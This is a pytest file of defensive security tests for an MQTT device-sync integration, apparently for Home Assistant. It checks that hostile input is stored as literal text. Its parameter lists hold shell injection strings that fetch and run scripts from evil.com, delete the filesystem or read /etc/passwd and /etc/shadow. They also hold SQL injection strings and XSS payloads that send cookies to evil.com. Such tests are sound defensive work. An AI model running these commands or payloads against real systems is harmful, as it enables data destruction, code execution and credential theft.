"""Security-focused tests.

Even though we're not executing shell commands or SQL, we should still
verify that potentially malicious input is handled safely.
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock

import pytest

from custom_components.mqtt_device_sync import MqttDeviceSyncCoordinator


class TestPathTraversalAttempts:
    """Test that path traversal strings don't cause issues."""

    def test_path_traversal_in_identifier(self, hass, config_entry, mock_mqtt_message):
        """Path traversal in identifier should be treated as literal string."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "../../../etc/passwd"}}
        msg = mock_mqtt_message(json.dumps(payload))

        # Should not raise, should be treated as literal string
        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    def test_path_traversal_in_area(self, hass, config_entry, mock_mqtt_message):
        """Path traversal in area name should be treated as literal string."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "test", "suggested_area": "../../root"}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestShellInjectionAttempts:
    """Test that shell metacharacters don't cause issues."""

    @pytest.mark.parametrize(
        "malicious_string",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com | sh",
            "'; DROP TABLE devices; --",
            "${IFS}cat${IFS}/etc/passwd",
            "\n/bin/sh",
            "$(curl evil.com/shell.sh | bash)",
        ],
    )
    def test_shell_injection_in_identifier(
        self, hass, config_entry, mock_mqtt_message, malicious_string
    ):
        """Shell injection attempts in identifier should be safe."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": malicious_string}}
        msg = mock_mqtt_message(json.dumps(payload))

        # Should not raise, should be treated as literal string
        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    @pytest.mark.parametrize(
        "malicious_string",
        [
            "; rm -rf /",
            "Kitchen; cat /etc/shadow",
            "Room$(id)",
            "Area`whoami`",
        ],
    )
    def test_shell_injection_in_area(
        self, hass, config_entry, mock_mqtt_message, malicious_string
    ):
        """Shell injection attempts in area should be safe."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "test", "suggested_area": malicious_string}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestSqlInjectionAttempts:
    """Test that SQL injection attempts don't cause issues."""

    @pytest.mark.parametrize(
        "malicious_string",
        [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "1'; DELETE FROM devices WHERE '1'='1",
            "UNION SELECT * FROM passwords",
            "1; UPDATE users SET admin=1 WHERE id=1; --",
        ],
    )
    def test_sql_injection_in_identifier(
        self, hass, config_entry, mock_mqtt_message, malicious_string
    ):
        """SQL injection attempts in identifier should be safe."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": malicious_string}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestXssAttempts:
    """Test that XSS attempts don't cause issues in stored values."""

    @pytest.mark.parametrize(
        "malicious_string",
        [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
        ],
    )
    def test_xss_in_identifier(
        self, hass, config_entry, mock_mqtt_message, malicious_string
    ):
        """XSS attempts in identifier should be stored literally."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": malicious_string}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    @pytest.mark.parametrize(
        "malicious_string",
        [
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=x onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
        ],
    )
    def test_xss_in_area_name(
        self, hass, config_entry, mock_mqtt_message, malicious_string
    ):
        """XSS attempts in area name should be stored literally."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "test", "suggested_area": malicious_string}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestPrototypePolllution:
    """Test that prototype pollution attempts are safe."""

    def test_proto_in_payload(self, hass, config_entry, mock_mqtt_message):
        """__proto__ in payload should be ignored."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {
            "device": {"identifiers": "test"},
            "__proto__": {"admin": True},
        }
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    def test_constructor_pollution(self, hass, config_entry, mock_mqtt_message):
        """constructor pollution attempt should be safe."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {
            "device": {"identifiers": "test"},
            "constructor": {"prototype": {"admin": True}},
        }
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestJsonBomb:
    """Test handling of JSON bombs / billion laughs attacks."""

    def test_repeated_keys(self, hass, config_entry, mock_mqtt_message):
        """Repeated keys should use last value (Python behavior)."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        # Note: JSON spec says behavior for duplicate keys is undefined
        # Python's json module uses the last value
        raw = '{"device": {"identifiers": "first"}, "device": {"identifiers": "second"}}'
        msg = mock_mqtt_message(raw)

        coordinator.handle_message(msg)
        # Should handle gracefully, using second value
        hass.async_create_task.assert_called_once()


class TestResourceExhaustion:
    """Test handling of resource exhaustion attempts."""

    def test_very_deep_nesting(self, hass, config_entry, mock_mqtt_message):
        """Very deep nesting should not cause stack overflow."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)

        # Create deeply nested structure
        depth = 500
        nested = {"identifiers": "test"}
        for _ in range(depth):
            nested = {"nested": nested}
        payload = {"device": nested}
        msg = mock_mqtt_message(json.dumps(payload))

        # Should not crash (identifiers won't be found though)
        coordinator.handle_message(msg)

    def test_many_array_elements(self, hass, config_entry, mock_mqtt_message):
        """Many array elements should be handled."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        identifiers = [f"id_{i}" for i in range(10000)]
        payload = {"device": {"identifiers": identifiers}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    def test_many_object_keys(self, hass, config_entry, mock_mqtt_message):
        """Many object keys should be handled."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        extra_keys = {f"key_{i}": f"value_{i}" for i in range(10000)}
        payload = {"device": {"identifiers": "test", **extra_keys}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()


class TestControlCharacters:
    """Test handling of control characters."""

    def test_null_byte_in_string(self, hass, config_entry, mock_mqtt_message):
        """Null byte in string should be handled."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "test\x00injection"}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    def test_control_chars_in_area(self, hass, config_entry, mock_mqtt_message):
        """Control characters in area name should be handled."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": "test", "suggested_area": "Area\x00\x01\x02"}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()

    @pytest.mark.parametrize(
        "control_char",
        ["\x00", "\x01", "\x7f", "\x1b[31m", "\r\n", "\t", "\b"],
    )
    def test_various_control_chars(
        self, hass, config_entry, mock_mqtt_message, control_char
    ):
        """Various control characters should be handled safely."""
        coordinator = MqttDeviceSyncCoordinator(hass, config_entry)
        payload = {"device": {"identifiers": f"test{control_char}id"}}
        msg = mock_mqtt_message(json.dumps(payload))

        coordinator.handle_message(msg)
        hass.async_create_task.assert_called_once()
